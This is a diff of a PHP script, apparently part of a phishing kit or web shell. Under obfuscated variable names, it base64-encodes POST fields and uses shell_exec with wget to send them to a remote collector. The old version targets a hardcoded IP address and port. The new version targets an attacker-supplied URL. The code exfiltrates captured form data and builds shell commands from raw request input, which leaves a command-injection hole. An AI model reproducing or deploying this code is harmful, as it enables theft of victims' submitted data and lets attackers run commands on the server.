@@ -48,7 +48,9 @@ $google847446 = $_POST["linux1"];
 
 $google847446 = base64_encode($google847446);
 
-echo shell_exec("wget -q -U 'Mozille84' --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google847412 . "&linux1=" . $google847446 . "&linux4=" . $google84744 . "' 'http://66.42.114.132:8884/?linux84=linux84' --header='Content-type: application/x-www-form-urlencoded'");
+$googlelinux84 = $_POST["url84"];
+
+echo shell_exec("wget -q -U 'Mozille84' --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google847412 . "&linux1=" . $google847446 . "&linux4=" . $google84744 . "' '" . $googlelinux84 . "/linux8474.php?q=linux84' --header='Content-type: application/x-www-form-urlencoded'");
 
 }
 
